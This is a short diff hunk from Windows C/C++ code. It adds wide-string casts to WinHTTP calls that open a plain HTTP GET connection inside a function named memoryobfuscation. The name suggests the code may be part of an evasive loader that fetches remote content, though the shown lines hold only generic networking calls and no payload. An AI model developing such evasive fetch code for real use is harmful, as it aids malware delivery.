@@ -186,10 +186,10 @@ void memoryobfuscation(){
         path[j] = '\0'; // Null-terminate path
     }
     
-    HINTERNET hConnect = WinHttpConnect(hSession, domain, 80, 0); // 443 for HTTPS
+    HINTERNET hConnect = WinHttpConnect(hSession, (LPCWSTR)domain, 80, 0); // 443 for HTTPS
     if (!hConnect) return;
      
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, NULL); //,WINHTTP_FLAG_SECURE);
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", (LPCWSTR)path, NULL, NULL, NULL, NULL); //,WINHTTP_FLAG_SECURE);
     if (!hRequest) return;
     
     if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) return;
